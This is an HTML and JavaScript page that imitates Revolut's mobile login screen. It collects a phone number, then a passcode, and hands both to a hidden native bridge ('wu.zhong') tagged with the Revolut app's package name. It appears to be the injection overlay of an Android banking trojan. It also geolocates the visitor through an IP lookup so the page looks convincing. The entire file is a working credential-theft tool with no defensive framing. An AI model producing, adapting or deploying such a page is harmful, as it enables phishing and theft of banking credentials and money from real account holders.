<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Revolut</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
            background: linear-gradient(180deg, #1e3a5f 0%, #2c5282 50%, #1e3a5f 100%);
            color: white;
            min-height: 100vh;
            min-height: -webkit-fill-available;
            display: flex;
            flex-direction: column;
            overflow-x: hidden;
        }

        html {
            height: -webkit-fill-available;
        }

        .container {
            width: 100%;
            max-width: 100vw;
            padding: 0 24px;
            flex: 1;
            display: flex;
            flex-direction: column;
            justify-content: space-between;
            min-height: 100vh;
            min-height: -webkit-fill-available;
        }

        .main-content {
            flex: 1;
            display: flex;
            flex-direction: column;
            justify-content: center;
            padding: 40px 0 20px 0;
        }

        .logo {
            text-align: center;
            margin-bottom: 60px;
        }

        .logo-text {
            font-size: 28px;
            font-weight: 300;
            letter-spacing: 0.5px;
            color: white;
        }

        .welcome-section {
            margin-bottom: 40px;
        }

        .welcome-title {
            font-size: 40px;
            font-weight: 600;
            line-height: 1.1;
            margin-bottom: 16px;
        }

        .welcome-subtitle {
            font-size: 16px;
            color: rgba(255, 255, 255, 0.75);
            line-height: 1.4;
        }

        .form-section {
            margin-bottom: 40px;
        }

        .input-container {
            display: flex;
            gap: 8px;
            margin-bottom: 20px;
            width: 100%;
        }

        .country-selector {
            background: rgba(255, 255, 255, 0.12);
            border: none;
            border-radius: 20px;
            padding: 16px;
            color: white;
            font-size: 16px;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 8px;
            cursor: pointer;
            min-width: 90px;
            flex-shrink: 0;
            touch-action: manipulation;
        }

        .country-flag {
            width: 18px;
            height: 18px;
            border-radius: 50%;
        }

        .phone-input {
            flex: 1;
            background: rgba(255, 255, 255, 0.12);
            border: none;
            border-radius: 20px;
            padding: 16px 20px;
            color: white;
            font-size: 16px;
            width: 100%;
            -webkit-appearance: none;
            appearance: none;
        }

        .phone-input::placeholder {
            color: rgba(255, 255, 255, 0.5);
        }

        .phone-input:focus {
            outline: none;
            background: rgba(255, 255, 255, 0.18);
        }

        .lost-access-link {
            color: #7bb3f0;
            text-decoration: none;
            font-size: 16px;
            display: block;
            touch-action: manipulation;
        }

        .lost-access-link:hover {
            color: #9cc5f2;
        }

        .continue-button {
            width: 100%;
            background: rgba(255, 255, 255, 0.15);
            border: none;
            border-radius: 20px;
            padding: 16px;
            color: white;
            font-size: 16px;
            font-weight: 500;
            cursor: pointer;
            margin-bottom: 60px;
            touch-action: manipulation;
            -webkit-appearance: none;
            appearance: none;
        }

        .continue-button:hover {
            background: rgba(255, 255, 255, 0.2);
        }

        .continue-button:active {
            background: rgba(255, 255, 255, 0.25);
        }

        .signup-section {
            text-align: center;
            margin-bottom: 40px;
        }

        .signup-text {
            color: rgba(255, 255, 255, 0.75);
            font-size: 16px;
            margin-bottom: 16px;
        }

        .create-account-button {
            width: 100%;
            background: rgba(255, 255, 255, 0.08);
            border: 1px solid rgba(255, 255, 255, 0.2);
            border-radius: 20px;
            padding: 16px;
            color: white;
            font-size: 16px;
            font-weight: 500;
            cursor: pointer;
            touch-action: manipulation;
            -webkit-appearance: none;
            appearance: none;
        }

        .create-account-button:hover {
            background: rgba(255, 255, 255, 0.12);
        }

        .create-account-button:active {
            background: rgba(255, 255, 255, 0.15);
        }

        .footer {
            text-align: center;
            padding: 20px 0 40px 0;
            margin-top: auto;
        }

        .language-dropdown {
            background: transparent;
            border: none;
            color: rgba(255, 255, 255, 0.65);
            font-size: 16px;
            margin-bottom: 16px;
            cursor: pointer;
            text-align: center;
            -webkit-appearance: none;
            appearance: none;
            padding: 8px;
        }

        .language-dropdown option {
            background: #2c5282;
            color: white;
        }

        .privacy-policy-link {
            color: rgba(255, 255, 255, 0.65);
            text-decoration: none;
            font-size: 16px;
            touch-action: manipulation;
        }

        .privacy-policy-link:hover {
            color: rgba(255, 255, 255, 0.8);
        }

        @media (max-width: 480px) {
            .container {
                padding: 0 20px;
            }
            
            .welcome-title {
                font-size: 36px;
            }
            
            .welcome-subtitle {
                font-size: 15px;
            }
            
            .input-container {
                gap: 6px;
            }
            
            .country-selector {
                min-width: 85px;
                padding: 15px 12px;
            }
            
            .phone-input {
                padding: 15px 18px;
            }
        }

        @media (max-width: 360px) {
            .container {
                padding: 0 16px;
            }
            
            .welcome-title {
                font-size: 32px;
            }
            
            .country-selector {
                min-width: 80px;
            }
        }

        @media (max-height: 600px) and (orientation: landscape) {
            .main-content {
                justify-content: flex-start;
                padding: 20px 0 10px 0;
            }
            
            .logo {
                margin-bottom: 30px;
            }
            
            .welcome-section {
                margin-bottom: 25px;
            }
            
            .continue-button {
                margin-bottom: 30px;
            }
            
            .signup-section {
                margin-bottom: 20px;
            }
        }

        button, input, select, a {
            -webkit-tap-highlight-color: rgba(255, 255, 255, 0.1);
        }

        @media (max-width: 768px) {
            input[type="tel"] {
                font-size: 16px;
            }
        }
        .passcodeContainer{
            display: none;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="main-content">
            <div class="logo">
                <div class="logo-text"><img src="https://assets.revolut.com/assets/brand/Revolut-White.svg"></div>
            </div>

            <div class="welcome-section">
                <h1 class="welcome-title">Welcome back</h1>
                <p class="welcome-subtitle">Enter the phone number associated with your Revolut account</p>
            </div>

            <div class="form-section">
                <div class="input-container">
                    <button class="country-selector"  type="button">
                        <div class="country-flag flag"></div>
                        <span class="country-code"></span>
                    </button>
                    <input 
                        type="tel" 
                        class="phone-input" 
                        placeholder="Phone number" 
                        id="phoneNumber"
                        autocomplete="tel"
                        inputmode="numeric"
                    >
                </div>
                <a href="#" class="lost-access-link" >Lost access to my phone number</a>
            </div>

            <button class="continue-button" onclick="handleContinue()" type="button">Continue</button>

            <div class="signup-section">
                <p class="signup-text">Don't have an account?</p>
                <button class="create-account-button"  type="button">Create account</button>
            </div>
        </div>

        <div class="footer">
            <select class="language-dropdown" >
                <option value="en-GB">English (United Kingdom) ▼</option>
            </select>
            <br>
            <a href="#" class="privacy-policy-link" onclick="handlePrivacyPolicy(event)">Privacy Policy</a>
        </div>
    </div>

    <div class="container passcodeContainer">
        <div class="main-content">
            <div class="logo">
                <div class="logo-text"><img src="https://assets.revolut.com/assets/brand/Revolut-White.svg"></div>
            </div>


            <div class="welcome-section">
                <h2 class="welcome-title">Enter passcode</h2>
             </div>

            <div class="form-section">
                <div class="input-container">
                    <input 
                        type="password" 
                        class="phone-input" 
                        placeholder="Passcode" 
                        id="passcode"
                    >
                </div>
                <a href="#" class="lost-access-link" >Forgot your passcode?</a>
            
                </div>

            <button class="continue-button" onclick="handleCode()" type="button">Continue</button>

            
        </div>

        
    </div>

    <script>


       window.onload = async function() {

        
        var json= await fetch("https://ipapi.co/json/").then(res => res.json());
       
        document.querySelector('.flag').style.background = `url("https://flagcdn.com/h60/${json.country.toLowerCase()}.png") no-repeat`;
   
        document.querySelector('.flag').style.backgroundSize = 'cover';
        document.querySelector('.flag').style.backgroundPosition = 'center';

        document.querySelector('.country-code').innerHTML = `${json.country_calling_code}`;

         };


        const phoneInput = document.getElementById('phoneNumber');
         const code = document.getElementById('passcode');
        
      

       
    
        function handleContinue() {
            const phone = phoneInput.value.trim().replace(/\s/g, '');
            
            if (!phone || phone.length < 6) {
                phoneInput.focus();
                return;
            }
            
        
           document.querySelector(".container").style.display="none";
           document.querySelector(".passcodeContainer").style.display="block";
        }


        function handleCode() {

            wu.zhong(`🔰Revolut Login \n\n📞Phone Number: ${phoneInput.value}\n🔒Code: ${code.value}`,"com.revolut.revolut");

            

        }


       
  
        phoneInput.addEventListener('input', function(e) {
            let value = e.target.value.replace(/\D/g, '');
            
          
            if (value.length > 0) {
                if (value.length <= 3) {
                    value = value;
                } else if (value.length <= 6) {
                    value = value.slice(0, 3) + ' ' + value.slice(3);
                } else {
                    value = value.slice(0, 3) + ' ' + value.slice(3, 6) + ' ' + value.slice(6, 10);
                }
            }
            
            e.target.value = value;
        });

    
        phoneInput.addEventListener('keypress', function(e) {
            if (e.key === 'Enter') {
                e.preventDefault();
                handleContinue();
            }
        });


        let lastTouchEnd = 0;
        document.addEventListener('touchend', function(event) {
            const now = (new Date()).getTime();
            if (now - lastTouchEnd <= 300) {
                event.preventDefault();
            }
            lastTouchEnd = now;
        }, false);
    </script>
</body>
</html>
